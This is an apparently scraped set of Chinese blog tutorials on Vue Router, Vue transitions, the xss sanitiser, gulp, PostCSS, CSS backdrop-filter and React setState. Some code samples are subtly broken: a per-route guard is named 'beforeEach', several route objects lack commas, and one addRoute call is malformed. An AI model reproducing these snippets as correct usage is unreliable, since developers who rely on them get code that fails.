\u0026quot;vue-router\u0026quot;\rimport Hallo from './components/Hallo'\rimport Home from './components/Home'\rimport Index from './components/Index' const routes = [ {\rpath: \u0026quot;/Home\u0026quot;, name: \u0026quot;Home\u0026quot;, component: Home,\rchildren: [\r{path:\u0026quot;/\u0026quot;,component: Home},\r{path:\u0026quot;Index\u0026quot;,component: Index}\r]\r},\r{\rpath: \u0026quot;/Hallo\u0026quot;,\rname: \u0026quot;Hallo\u0026quot;,\rcomponent: Hallo\r}\r]\rconst router = createRouter({\rhistory: createWebHashHistory(),\rroutes: routes\r})\rexport default router\rmain.js\nimport { createApp } from 'vue'\rimport App from './App.vue'\rimport router from './router'\rcreateApp(App).use(router).mount('#app')\r为路由匹配到组件（路由视图），它会表示渲染出使用切换的组件\npath是链接路径，name为链接名称，component为导入的组件模板名，多个地址用逗号分开，children为子路由声明，\n带参数的动态路由\nUser.vue\n\u0026lt;template\u0026gt;\r\u0026lt;div\u0026gt;\r{{ $route.params.id }}\r\u0026lt;/div\u0026gt;\r\u0026lt;/template\u0026gt;\rrouter.js\n{ path: \u0026ldquo;/User/:id\u0026rdquo;, name: \u0026ldquo;User\u0026rdquo;, component: User }\n访问http://localhost:8080/#/User/admin\n可以看页面显示了admin，说明通过路由传递了参数到模板中，其中id的参数在模板是以$route.params.id方式获取的\n去掉#：因为我这里vue-router路由模式设置为hash（createWebHashHistory），需要开启history（createWebHistory）\nimport {createWebHistory} from \u0026quot;vue-router\u0026quot;\rconst router = createRouter({\rhistory: createWebHistory(),\rroutes: routes\r})\r获取获取以什么开头的路由\n{\rpath: '/User:pathMatch(.*)*',\rname: 'User',\rcomponent: User\r},\r可以看到使用了路由，例如http://localhost:8080/Useraaa/等等，只要是Userxxx以及Userxxx/xxx都会渲染User组件\npath: \u0026lsquo;/User:afterUser(.*)\u0026rsquo;,这个效果和上面一样\n当Url需要纯数字时：\n{\rpath: '/User/:id(\\\\d+)',\rname: 'User',\rcomponent: User\r},\rhttp://localhost:8080/User/666\n复用参数（0个或多个用*，1个或多个用+）\n在上面的基础上改：\n{\rpath: '/User/:id(\\\\d+)+',\rname: 'User',\rcomponent: User\r},\r访问http://localhost:8080/#/User/666/111，可以看到，模板的{{ $route.params.id }}，渲染出[ \u0026ldquo;666\u0026rdquo;, \u0026ldquo;111\u0026rdquo; ]这样的数组，而不是字符串了，因此可以使用$route.params.id[1]，来精确获取第几个路由\n嵌套路由（User路由中使用了Admin路由，子路由）\nUser.vue\n\u0026lt;template\u0026gt;\r\u0026lt;div\u0026gt;\r{{ $route.params.id }}\r\u0026lt;router-view\u0026gt;\u0026lt;/router-view\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/template\u0026gt;\rUserAdmin.vue\n\u0026lt;template\u0026gt;\r\u0026lt;div\u0026gt;\rhallo admin\r\u0026lt;/div\u0026gt;\r\u0026lt;/template\u0026gt;\rrouter.js\n{\rpath: '/User/:id(\\\\d+)+',\rname: 'User',\rcomponent: User,\rchildren: [\r{\rpath: 'admin',\rcomponent: UserAdmin\r}\r]\r},\r访问http://localhost:8080/#/User/666/admin，可以看到hallo admin\n编程式路由（非router-link）\nApp.vue\n\u0026lt;template\u0026gt;\r\u0026lt;div @click=\u0026quot;goAdmin\u0026quot;\u0026gt;go\u0026lt;/div\u0026gt;\r\u0026lt;br/\u0026gt;\r\u0026lt;router-view\u0026gt;\u0026lt;/router-view\u0026gt;\r\u0026lt;/template\u0026gt;\r\u0026lt;script\u0026gt;\rimport {useRouter} from 'vue-router'\rexport default{\rsetup(){\rconst router = useRouter()\rlet goAdmin = () =\u0026gt;{\rrouter.push(\u0026quot;/User/123\u0026quot;)\r}\rreturn{\rgoAdmin\r}\r}\r}\r\u0026lt;/script\u0026gt;\r可以看到点击了\u0026lt;div @click=\u0026ldquo;goAdmin\u0026rdquo;\u0026gt;go，就会跳转到http://localhost:8080/User/123\n除了通过字符串外，还可以router.push({path: \u0026lsquo;/User/123\u0026rsquo;})\n传递参数（模板{{ $route.params.id }}）\nparams方式\nrouter.push({name: \u0026lsquo;User\u0026rsquo;, params: { id: 666 }})\n访问http://localhost:8080/User/666\nquery方式\nrouter.push({path: \u0026lsquo;/User\u0026rsquo;, query: { id: 123 }})\n访问http://localhost:8080/User?id=123\nquery方式获取参数，需要使用{{$route.query.id}}，而不是$route.params.id了\nhash方式\nrouter.push({ path: \u0026lsquo;/User\u0026rsquo;, hash: \u0026lsquo;#admin\u0026rsquo; })\n访问http://localhost:8080/User#admin\n使用{{$route.hash}}获取参数\n动态路由参数\nlet user = \u0026lsquo;admin\u0026rsquo; router.push({ name: \u0026lsquo;User\u0026rsquo;, params: { user } })\nreplace（使用该跳转，将不会创建会话历史记录，会替代上一个会话的记录）\nrouter.replace({ path: \u0026lsquo;/User\u0026rsquo;})\n使用replace: true参数也是可以给push设置（push的replace默认为false）\nrouter.push({ path: \u0026lsquo;/User\u0026rsquo;, replace: true })\n会话历史记录跳跃\n前进n条记录（前进2页） router.go(2)\n返回n条记录（后退2页面）\nrouter.go(-2)\n例如：\nApp.vue\nimport {useRouter} from 'vue-router'\rexport default{\rsetup(){\rconst router = useRouter()\rlet goAdmin = () =\u0026gt;{\rrouter.go(2)\r}\rreturn{\rgoAdmin\r}\r}\r}\r路由的name属性的作用：\n除了像这样用外Go\n还可以用name属性指向一个路由的path，防止路由地址写错，设置params属性给模板接收参数（这个参数不会作用于URL），Go\n当需要在同级下渲染多个router-view，如何确保其router-view渲染的是自己想要的，利用router-view的name属性（该属性默认值为default）\nApp.vue\nrouter.js\nimport User from './components/User.vue' import A from './components/a.vue' import B from './components/b.vue' import C from './components/c.vue' const routes = [ {\rpath: '/User',\rname: 'User',\rcomponents:{\rdefault: User,\ra:A,\rb:B,\rc:C\r}\r}\r]\rconst router = createRouter({\rhistory: createWebHashHistory(),\rroutes: routes\r})\rexport default router\r访问http://localhost:8080/User，可以看到渲染出了a组件，b组件，c组件\n其中router.js的小写a就是指向了router-view的name属性，大写的A就是组件，和name属性对应上（键值对），将其对应渲染到相应的router-view中\ncomponents属性为多组件配置\n重定向（当希望访问到某个路由时，能跳转到另一个路由时）\nconst routes = [ {\rpath: \u0026quot;/Home\u0026quot;, name: \u0026quot;Home\u0026quot;,\rredirect: '/', components: {\rdefault: Home\r}\r}\r]\r访问http://localhost:8080/Home\n设置还可以指向一个路由的name属性，const routes = [{ path: \u0026lsquo;/Home\u0026rsquo;, redirect: { name: \u0026lsquo;User\u0026rsquo; } }]\n另外如果一个路由使用了redirect重定向，那么是可以不用写component了，因为不会真正访问到（访问到就重定向到另一个路由了），但是存在子路由时就需要写component了\n当重定向发生时，也需要传递参数到重定向时，例如：\n{\rpath: '/User/:id',\rname: 'User',\rcomponents:{\rdefault: User,\r} ,\rredirect: to =\u0026gt;{\rreturn { path: '/', query: { id: to.params.id } }\r}\r}\r当访问http://localhost:8080/User/123时，会重定向到http://localhost:8080/?id=123，如果/User/123的123，被传到query了，另外还可以在重定向的目标组件模板用{{$route.query.id}}获取到该参数\n重定向别名\n{\rpath: \u0026quot;/Home\u0026quot;, name: \u0026quot;Home\u0026quot;,\rcomponents: {\rdefault: Home,\r},\ralias: '/User',\r}\r别名就是访问http://localhost:8080/User/时，实质上是访问/Home这个路由，和redirect的区别就是，redirect会改变URL，而alias不会改变URL\n利用子路由来给多路由匹配组件\n{\rpath: \u0026quot;/Home/:id\u0026quot;, name: \u0026quot;Home\u0026quot;,\rcomponent: Home,\rchildren: [\r{ path: '', component: Homea, alias: [':id','admin', '/User'] },\r]\r}\r当访问http://localhost:8080/Home/123，http://localhost:8080/Home/admin，http://localhost:8080/User时，渲染的是Home组件\n路由props传参（通过props接收参数）\nroutes.js\n{\rpath: '/hallo/:id',\rcomponent: Home,\rprops: true\r}\rHome.vue\n\u0026lt;template\u0026gt;\r\u0026lt;div\u0026gt;\rhallo {{id}}\r\u0026lt;/div\u0026gt;\r\u0026lt;/template\u0026gt;\r\u0026lt;script\u0026gt;\rexport default {\rprops: ['id']\r}\r\u0026lt;/script\u0026gt;\r当props为true时，其route.query（router.params）将被设置为该组件的属性，可直接访问其参数\n对于有命名视图的路由，必须为每个命名视图定义props配置，例如：\n{\rpath: \u0026quot;/Home/:id\u0026quot;, name: \u0026quot;Home\u0026quot;,\rcomponents: {\rdefault: Home,\rindex: Index\r},\rprops:{\rdefault: true, index: false\r}, },\r在上面例子中props是对象形式，可以看到index组件就算props接收了id参数，但是因为其路由props设置了false，导致其route.query（router.params）没有设置为该组件的属性，因此没有id参数\nroutes.js\n{\rpath: \u0026quot;/Home\u0026quot;, name: \u0026quot;Home\u0026quot;,\rcomponent: Home,\rprops: (route) =\u0026gt; ({id : route.query.id }) },\rHome.vue\n\u0026lt;template\u0026gt;\r\u0026lt;div\u0026gt;\rhallo {{id}}\r\u0026lt;/div\u0026gt;\r\u0026lt;/template\u0026gt;\r\u0026lt;script\u0026gt;\rexport default {\rprops: ['id']\r}\r\u0026lt;/script\u0026gt;\r访问http://localhost:8080/Home?id=123，Home输出123\n上面例子中route.query.id就是当前query（id=123），将其传入到id中，然后模板接收\n注意：函数模式请不要用于多组件components中，在多组件components中，需要给除default外的组件设置router-view的name属性\n导航守卫（导航守卫实质上就是路由跳转时的钩子函数，守卫是异步执行的）\n全局前置守卫：beforeEach\nrouter.beforeEach((to,form)=\u0026gt;{ return false})\n守卫接收2个参数，to是跳转的目标路由，form是跳转离开的路由，返回值如果为false时，表示取消当前导航，当返回值为路由地址时，会跳转到该路由地址，还有一个next()可选参数，该可选参数表示放行\n当next(false)时，表示取消当前导航，当next(\u0026rsquo;/Home\u0026rsquo;)时，会跳转到/Home（和router.push类似）\n如果守卫抛出Error时，取消导航并且调用router.onError()\n守卫正常时是undefined或返回true\n例如：\nroutes.js\nconst router = createRouter({\rhistory: createWebHistory(),\rroutes: routes\r})\rrouter.beforeEach((to, from, next) =\u0026gt; {\rif (to.name !== \u0026quot;Home\u0026quot;) {\rnext({\rname: 'Home'\r})\r} else {\rnext()\r}\r})\r像上面的例子中，全局路由守卫将会监听要跳转的路由的name属性是否为Home，如果不是Home就会调用next()方法跳转到name为Home的路由，如果是Home的话守卫放行\n全局解析守卫：beforeResolve\n全局解析守卫和全局前置守卫类似，都是路由跳转前调用，但是beforeResolve会在beforeEach（全局前置守卫）和beforeRouteEnter（组件路由守卫）之后触发，afterEach（全局后置守卫）之前触发\nrouter.beforeResolve((to, from, next) =\u0026gt; {\rif (to.name !== \u0026quot;Home\u0026quot;) {\rnext({\rname: 'Home'\r})\r} else {\rnext()\r}\r})\r可以看到效果和beforeEach一样\n全局后置守卫：afterEach（没有next()，全局后置守卫顾名思义，就是路由跳转后触发）\nrouter.afterEach((to, from) =\u0026gt; {\rconsole.log(to.name)\rconsole.log(from.name)\r})\r路由独享的守卫beforeEach（在路由内部定义的beforeEach守卫）\n{\rpath: \u0026quot;/Home\u0026quot;, name: \u0026quot;Home\u0026quot;,\rcomponent: Home,\rbeforeEach: (to,from) =\u0026gt;{\rif (to.name !== \u0026quot;Home\u0026quot;) {\rnext({\rname: 'Home'\r})\r} else {\rnext()\r}\r}\r},\r路由独享的守卫beforeEach只在进入路由时触发（params，query，hash改变并不会触发）\n组件路由守卫：beforeRouteEnter，beforeRouteUpdate，beforeRouteLeave\nbeforeRouteEnter：在渲染该组件时对应的路由被确定前触发，在该守卫触发时，组件实例未被创建，因此不能获取组件实例的任何东西\nbeforeRouteUpdate：当前路由发送改变，但是该组件又被复用时触发，比如传参，只是改变参数，但是复用了当前组件，该守卫触发时，组件实例已被挂载，可访问组件实例\nbeforeRouteLeave：当导航离开渲染该组件的路由时触发，可访问组件实例\n例如：\nHome.vue\nexport default {\rbeforeRouteEnter(to, from, next) {\rnext(vm =\u0026gt;{\rconsole.log(vm) // 可以看到vm是组件实例，说明可以通过next来访问组件实例，next()会在导航被确认时被回调\r})\r},\rbeforeRouteUpdate(to, from, next) {\rif (to.name !== \u0026quot;Home\u0026quot;) {\rnext({\rname: 'Home'\r})\r} else {\rnext({\rname: 'User'\r})\r}\rconsole.log(to.name)\rconsole.log(from.name)\r},\rbeforeRouteLeave(to, from, next) {\rif(to.name !==\u0026quot;Home\u0026quot;){\rif(confirm('您的信息还未保存，确定要离开吗？') == true){\rnext()\r}else{\rnext(false)\r}\r}\rconsole.log(to.name)\rconsole.log(from.name)\r},\r}\r路由元信息（路由meta字段属性）\n{\rpath: \u0026quot;/Home\u0026quot;, name: \u0026quot;Home\u0026quot;,\rcomponent: Home,\rmeta: { ha: false }\r}\r},\rrouter.beforeEach((to, from, next) =\u0026gt; {\rif (to.name == 'Home' \u0026amp;\u0026amp; to.meta.ha){\rnext()\r}else{\rnext(false)\r}\r})\r路由懒加载（动态导入）\nconst User = () =\u0026gt; import('./components/User.vue')\rconst routes = [{ path: '/User', name: 'User'\rcomponent: User }]\r动态路由\nconst routes = [{ path: '/:id', name: 'User'\rcomponent: User }]\rconst router = createRouter({\rhistory: createWebHistory(),\rroutes: routes\r})\rrouter.addRoute({ path: '/Home',name: 'Home', component: Home }) // 添加路由\rrouter.removeRoute('Home') // 删除路由\r注意：当路由被删除时，路由别名和子路由同时也被删除\n不只是在路由router中设置，还可以在路由守卫设置，而且当2个addRoute路由的name重名时，也会触发删除路由，当路由没有name属性时，可通过定义回调函数，让其重新添加路由（实质上是删除路由，因为重复了）,例如：\nconst RoutesData = router.addRoute(path: '/Index', component: Home )\rRoutesData()\r嵌套路由\nrouter.addRoute({ path: '/User', name: 'User', component: User })\rrouter.addRoute('User', { path: 'Admin', component: Home })\rvue中解决xss脚本攻击（依赖于xss模块）\nnpm install xss \u0026ndash;save\n引用xss模块\nimport xss from 'xss'\rObject.defineProperty(Vue.prototype, '$xss', {\rvalue: xss\r})\r在评论框或者其他输入框等等要针对免疫xss地方使用$xss()方法\n自定义拦截规则\n在data字段，return字段下设置白名单，格式就是标签名加属性，只要不是白名单的标签和属性，就是会被过滤掉\noptions : {\rwhiteList: {\ra: ['href', 'title'],\rdiv: ['class']\r}\r}\rvue中解决html和Markdown转换\nMarkdownToHtml（处理md转换为html）\nnpm install showdown \u0026ndash;save\n使用方法：\nimport showdown\rlet converter = new showdown.Converter()\rlet text = '# hallo word' // md格式的文本\rlet html = converter.makeHtml(text)\rHtmlToMarkdown（处理html转换为md）\nnpm install turndown \u0026ndash;save\n使用方法：\nimport turndown\rlet turndownService = new turndown()\rlet markdown = turndownService.turndown('\u0026lt;h1\u0026gt;hallo word\u0026lt;/h1\u0026gt;')\rvuejs是声明式视图层框架，视图层框架分为命令式和声明式两种，命令式关注过程，声明式关注结果，命令式的代码描述了工作过程，而声明式的代码只声明，结果由框架来提供\nvuejs内部实现肯定是命令式的，但是进行封装了工作过程，对外暴露的是声明式，声明式的性能并没有命令式的性能优，因为命令式的工作流程一目了然，去除或者添加某个功能，理论上能做到最优性能\n而声明式只关注了结果，需要查找前后代码的差异（虚拟dom+diff算法），然后再更新，vuejs选择声明式的方案是为了可维性，不需要关心工作过程，只需要关注结果就好了\n虚拟DOM对比innerHTML操作DOM\n创建DOM：虚拟DOM和innerHTML操作DOM都是创建所有DOM元素，因此虚拟DOM和innerHTML操作DOM基本上性能是一致的（DOM层计算）\n更新DOM：innerHTML操作DOM更新是先重新创建HTML字符串，然后再更新DOM元素（销毁旧的DOM元素，重新创建一个完整的DOM元素），而虚拟DOM是通过创建新的JavaScript对象，然后前后俩个JavaScript对象进行DIff比较，得到差异，只更新差异\n不难看出，虚拟DOM的优势在于更新DOM\n渲染器的作用就是将虚拟DOM（JavaScript对象）渲染成真实的DOM\n渲染器将JavaScript对象的值获得，并且以原生JavaScript方式渲染出来，当tag为字符串时，渲染标签元素，如果是函数（或者对象）那么表示该是组件，组件函数返回值本身就是虚拟DOM，如果是对象的话，获取对象的render函数，得到其返回值（这个实质上也是虚拟DOM），编译器（模板）原理上和渲染器是一样的\ntransition（过渡和动画）\n过渡：元素属性从一个属性过渡为另一个属性，例如元素的背景颜色从黑色过渡到白色\n动画：一个元素从一个地方移动到另一个地方\nvue内置了组件和API来完成动画和过渡\n过渡：\nconst app = Vue.createApp({\rdata(){\rreturn {\rishallo: false\r}\r},\rmethods:{\ronhalloClick(){\rthis.ishallo = ! this.ishallo\r}\r},\rtemplate: ` \u0026lt;button @click='onhalloClick'\u0026gt;点我隐藏/显示\u0026lt;/button\u0026gt;\r\u0026lt;transition\u0026gt;\r\u0026lt;div v-if=\u0026quot;ishallo\u0026quot;\u0026gt;hallo word\u0026lt;/div\u0026gt;\r\u0026lt;/transition\u0026gt;\r`\r})\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\r动画\nvue\nconst app = Vue.createApp({\rdata(){\rreturn {\rishallo: false\r}\r},\rtemplate: ` \u0026lt;div :class='{ hallo: ishallo }'\u0026gt;\r\u0026lt;button @click='ishallo = true'\u0026gt;点我触发动画\u0026lt;/button\u0026gt;\r\u0026lt;div v-if=\u0026quot;ishallo\u0026quot;\u0026gt;hallo word\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r`\r})\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\rcss样式\n.hallo {\ranimation: hallo 1s linear\r}\r@keyframes hallo {\r0% {\rtransform: translate3d(0px, 0, 0)\r}\r10% {\rtransform: translate3d(-2px, 0, 0)\r}\r60% {\rtransform: translate3d(2px, 0, 0)\r}\r100% {\rtransform: translate3d(0px, 0, 0)\r}\r}\r硬件加速：使用了perspective，backface-visibility和transform: translateZ()都可以触发硬件加速\n解决过渡和动画时间不一致\n，当使用该属性，动画结束，过渡会跟着结束\n，当使用该属性，过渡结束，动画会跟着结束\n统一管理动画和过渡时间\n，该属性值单位为毫秒，意思为1秒后结束动画和过渡\n，enter为进入动画和过渡时间，leave为离开动画和过渡时间\ntransition内置组件在一个过渡周期会触发6个状态，分别是v-enter-from，v-enter-active，v-enter-to，v-leave-from，v-leave-active，v-leave-to\nv-enter-from：表示过渡的开始状态，元素插入之前触发，元素插入后的下一帧移除\nv-enter-active：表示过渡生效时状态，在元素插入之前触发，在动画和过渡完成后移除\nv-enter-to：表示过渡的结束状态，在元素插入后下一帧触发，在动画和过渡完成后移除\nv-leave-from：表示离开过渡的开始状态，离开过渡时立即触发，下一帧后移除\nv-leave-active：表示离开过渡的生效状态，离开过渡时立即触发，在动画和过渡完成后移除\nv-leave-to：表示离开过渡的结束状态，离开过渡后下一帧触发，在动画和过渡完成后移除\n用法：\nconst app = Vue.createApp({\rdata(){\rreturn {\rishallo: false\r}\r},\rtemplate: ` \u0026lt;transition\u0026gt;\r\u0026lt;button @click='ishallo = true'\u0026gt;点我触发动画\u0026lt;/button\u0026gt;\r\u0026lt;div v-if=\u0026quot;ishallo\u0026quot;\u0026gt;hallo word\u0026lt;/div\u0026gt;\r\u0026lt;/transition\u0026gt;\r`\r})\rconst vm = app.mount(\u0026quot;#app\u0026quot;)\r样式\n.v-enter-active{\ranimation: hallo 1s; // 表示入场时触发时hallo动画\r}\r.v-leave-active{\ranimation: hallo 1s; // 表示出场时触发时hallo动画\r}\r@keyframes hallo {\r0% {\rtransform: translate3d(0px, 0, 0)\r}\r10% {\rtransform: translate3d(-2px, 0, 0)\r}\r60% {\rtransform: translate3d(2px, 0, 0)\r}\r100% {\rtransform: translate3d(0px, 0, 0)\r}\r}\r关闭css动画：，使用该属性表示将通过组件事件来触发动画，不再使用css动画了\n过渡模式：，该属性有2个值，out-in和in-out，默认同时进行\nout-in：当前元素先进行过渡，完成后新元素过渡进入\nin-out：新元素先进行过渡，完成后当前元素过渡离开\n该常用于动态组件的切换过渡，也是说out-in是当前元素先进行过渡，切换到新元素时，过渡进入，而in-out是新元素过渡，切换到当前元素时过渡离开\nname属性：，该属性表示自动生成css过渡类名，像例子中的，将生成为.hallo-enter等等，就是将过渡周期中的6个状态的v改成name属性值了\nvue devtools调试工具\n下载https://github.com/vuejs/vue-devtools\n解压，并且在该目录执行npm install\n修改manifest.json（该文件在项目目录的packages/shell-chrome），将persistent改为true\n打包npm run build\n以谷歌浏览器为例子，加载已解压的扩展程序，选择刚刚打包的目录的packages/shell-chrome文件夹\nvue3引入了tree-shaking技术，当没有在项目中使用某个模块时，那么该模块的代码将不会出现在打包中\nvue3抛弃了Object.defineProperty，改用Proxy来做数据的响应式\nvue3不再使用src托管，而采用monorepo管理\nvue3采用typescript编写源码，对typescript的兼容更好，vue2使用的是flow来处理类型检查\nvue3提供了Composition API，对于逻辑复用支持更好\n","permalink":"https://99999.fun/posts/75/","summary":"Vue CLI是vue官方脚手架，可以快速创建vue项目\n安装vue-cli3\nnpm install -g @vue/cli\n或者\nyarn global add @vue/cli\n升级\nnpm update -g @vue/cli\n或者\nyarn global upgrade \u0026ndash;latest @vue/cli\n创建vue项目\nvue create vue-demo\n如果提示vue : 无法将“vue”项识别为 cmdlet、函数、脚本文件或可运行程序的名称，可以使用npx vue create vue-demo\ndefault (babel, eslint) // 默认选项，包含babel和eslint\nManually select features // 自定义创建配置工程\n一般比较常用的有Babel，TypeScript，Router，CSS Pre-processors，Linter / Formatter\n空格为选择，enter为下一步\n跑vue项目\nnpm run serve\n或者\nyarn start/yarn run dev\n如果运行报错error Component name \u0026ldquo;Home\u0026rdquo; should always be multi-word vue/multi-word-component-names\n只需要在vue.config.js添加lintOnSave: false配置，例如：\nmodule.exports = defineConfig({\rtranspileDependencies: true,\rlintOnSave: false\r})\r这个问题的原因在于vue-cli默认开启了ESLint检测，关闭就好了","title":"深入学习vuejs"},{"content":"gulp.js是一个基于流(stream)的自动化构建工具，是开源的JavaScript自动化工具，基于node.js和npm的构建工具，可以处理压缩代码，合并代码，压缩图片，编译less等等任务\n全局安装gulp\nnpm install \u0026ndash;global gulp-cli\n或者\nyarn add gulp-cli -g\n初始化\nnpm init\n作为开发依赖进行安装gulp\nnpm install \u0026ndash;save-dev gulp\n或者\nyarn add gulp-cli -d\n安装依赖\nyarn add \u0026ndash;save-dev gulp-sass gulp-autoprefixer browser-sync gulp-notify\n创建gulpfile.js\n执行gulp\ngulp\n修改gulpfile.js\n导入gulp（这里用个变量接收）\nlet gulp = require(\u0026ldquo;gulp\u0026rdquo;);\n常用方法\ngulp.task() // 定义任务\ngulp.src() // 指向需要执行任务的文件\ngulp.dest() // 执行完任务的文件最后在哪里\ngulp.watch() // 监测文件是否发生变化\ngulp.task()其中有两个参数，分别是任务名称和一个回调函数\n例如：\nlet gulp = require(\u0026quot;gulp\u0026quot;);\rgulp.task(\u0026quot;test\u0026quot;, function() {\rreturn console.log(\u0026quot;hallo gulp\u0026quot;);\r});\r执行test任务（在终端，应用根目录下）\ngulp test\n默认任务\ngulp.task(\u0026quot;default\u0026quot;, function(){\rreturn console.log(\u0026quot;hallo gulp\u0026quot;);\r})\r拷贝任务\ngulp.task(\u0026quot;copyData\u0026quot;, function(){\rgulp.src(\u0026quot;src/*\u0026quot;).pipe(gulp.dest(\u0026quot;app\u0026quot;));\r})\r上面是将src文件夹下全部文件拷贝到app文件下，哪怕没有这个文件夹，gulp也会自动新建文件夹并且拷贝过去\n图片压缩任务\n安装依赖\nnpm install \u0026ndash;save-dev gulp-imagemin\n修改gulpfile.js\nlet imagemin = require(\u0026quot;gulp-imagemin\u0026quot;);\rgulp.task(\u0026quot;imageMin\u0026quot;, function(){\rgulp.src(\u0026quot;src/*.{png,jpg,gif,ico}\u0026quot;).pipe(imagemin(\r{\roptimizationLevel: 5,\rprogressive: true, interlaced: true, multipass: true,\rsvgoPlugins:[{removeViewBox: true}],\r}\r)).pipe(gulp.dest(\u0026quot;src/images\u0026quot;));\r})\rimagemin方法参数：\noptimizationLevel：压缩等级（0-7），默认值为3\nprogressive：是否无损压缩jpg图片，默认值为false\ninterlaced：隔行扫描gif渲染，默认值为false\nmultipass：多次优化svg，直到优化完毕，默认值为false\nsvgoPlugins: 移除svg的viewbox属性\nPostCSS是一个用JavaScript转换css的工具\n一般来说PostCSS不单独使用，会搭配构建工具（例如：Webpack，Gulp）使用，因此这里使用的是Gulp\n安装PostCSS依赖和gulp依赖\nyarn add gulp gulp-postcss postcss-cssnext postcss-short\n修改gulpfile.js\nconst gulp = require(\u0026quot;gulp\u0026quot;);\rconst postcss = require(\u0026quot;gulp-postcss\u0026quot;);\rconst cssnext = require(\u0026quot;postcss-cssnext\u0026quot;);\rconst shortcss = require(\u0026quot;postcss-short\u0026quot;);\rgulp.task(\u0026quot;postcss\u0026quot;, function() {\rconst processors = [\rshortcss,\rcssnext\r];\rreturn gulp.src(\u0026quot;./1.css\u0026quot;)\r.pipe(postcss(processors))\r.pipe(gulp.dest(\u0026quot;./css\u0026quot;));\r});\rgulp postcss\n执行完毕后自动添加css兼容前缀了，还支持下一代css的语法\n","permalink":"https://99999.fun/posts/73/","summary":"gulp.js是一个基于流(stream)的自动化构建工具，是开源的JavaScript自动化工具，基于node.js和npm的构建工具，可以处理压缩代码，合并代码，压缩图片，编译less等等任务\n全局安装gulp\nnpm install \u0026ndash;global gulp-cli\n或者\nyarn add gulp-cli -g\n初始化\nnpm init\n作为开发依赖进行安装gulp\nnpm install \u0026ndash;save-dev gulp\n或者\nyarn add gulp-cli -d\n安装依赖\nyarn add \u0026ndash;save-dev gulp-sass gulp-autoprefixer browser-sync gulp-notify\n创建gulpfile.js\n执行gulp\ngulp\n修改gulpfile.js\n导入gulp（这里用个变量接收）\nlet gulp = require(\u0026ldquo;gulp\u0026rdquo;);\n常用方法\ngulp.task() // 定义任务\ngulp.src() // 指向需要执行任务的文件\ngulp.dest() // 执行完任务的文件最后在哪里\ngulp.watch() // 监测文件是否发生变化\ngulp.task()其中有两个参数，分别是任务名称和一个回调函数\n例如：\nlet gulp = require(\u0026quot;gulp\u0026quot;);\rgulp.task(\u0026quot;test\u0026quot;, function() {\rreturn console.log(\u0026quot;hallo gulp\u0026quot;);\r});\r执行test任务（在终端，应用根目录下）\ngulp test","title":"gulp学习笔记"},{"content":"backdrop-filter是css原生的属性\nbackdrop-filter的一些方法（用法和filter一样）\nblur：模糊 brightness：亮度 contrast：对比度 invert：反相 opacity：透明度 saturate：饱和度 drop-shadow：投影 grayscale：灰度 hue-rotate：色调变化 sepia：褐色\n简单实现一个毛玻璃背景效果，例如：\n\u0026lt;style\u0026gt;\r*{\rmargin: 0;\rpadding: 0;\r}\r#app{\rwidth: 100%;\rheight: 50rem;\rbackground-image: url(\u0026quot;1.jpg\u0026quot;);\r}\r#test{\rposition: absolute;\rtop: 0;\rleft: 0;\rright: 0;\rbottom: 0;\rbackdrop-filter: blur(10px);\r}\r.text{\rpadding-top: 100px;\rtext-align: center;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div id=\u0026quot;test\u0026quot;\u0026gt;\r\u0026lt;p class=\u0026quot;text\u0026quot;\u0026gt;\rhallo word\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\rbackdrop-filter和filter区别：\nfilter是作用于当前元素（效果体现在本身，而不是背景），而且后代也会继承该属性\nbackdrop-filter是作用于当前元素背后的所有元素，不会影响自己\nbackdrop-filter兼容性没有filter优秀（目前低版本浏览器和IE，火狐都不支持该属性）\n","permalink":"https://99999.fun/posts/65/","summary":"backdrop-filter是css原生的属性\nbackdrop-filter的一些方法（用法和filter一样）\nblur：模糊 brightness：亮度 contrast：对比度 invert：反相 opacity：透明度 saturate：饱和度 drop-shadow：投影 grayscale：灰度 hue-rotate：色调变化 sepia：褐色\n简单实现一个毛玻璃背景效果，例如：\n\u0026lt;style\u0026gt;\r*{\rmargin: 0;\rpadding: 0;\r}\r#app{\rwidth: 100%;\rheight: 50rem;\rbackground-image: url(\u0026quot;1.jpg\u0026quot;);\r}\r#test{\rposition: absolute;\rtop: 0;\rleft: 0;\rright: 0;\rbottom: 0;\rbackdrop-filter: blur(10px);\r}\r.text{\rpadding-top: 100px;\rtext-align: center;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;div id=\u0026quot;test\u0026quot;\u0026gt;\r\u0026lt;p class=\u0026quot;text\u0026quot;\u0026gt;\rhallo word\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\rbackdrop-filter和filter区别：\nfilter是作用于当前元素（效果体现在本身，而不是背景），而且后代也会继承该属性\nbackdrop-filter是作用于当前元素背后的所有元素，不会影响自己\nbackdrop-filter兼容性没有filter优秀（目前低版本浏览器和IE，火狐都不支持该属性）","title":"简单利用backdrop-filter属性实现效果"},{"content":"setState()\n注意：如果调用多次setState()，但是还是只触发一次重新渲染（性能优化，如果每更新一次状态就渲染一次的话，很影响性能）\nsetState()是异步更新数据的，因此setState()不要依赖于前面的setState()，因为其不会立刻更新数据\n如果当前setState()依赖于前面的setState()，解决方法：\nthis.setState((state, props) =\u0026gt;{\rreturn{\rcount: state.count + 1\r}\r})\rconsole.log(this.state.count)\rthis.setState((state, props) =\u0026gt;{\rreturn{\rcount: state.count + 1\r}\r})\rconsole.log(this.state.count)\rstate和props参数分别获取到最新的state和最新的props，通过回调函数返回值，保证每次都获取到最新的state和props\n如果想在状态更新后（页面完成重新渲染）立刻执行某个操作，那么可以使用setState()的第二个参数，这个参数是一个回调函数\n例如：\nthis.setState((state, props) =\u0026gt;{\rreturn{\rcount: state.count + 1\r}\r},() =\u0026gt; {\rconsole.log(this.state.count)\r})\r可以看出 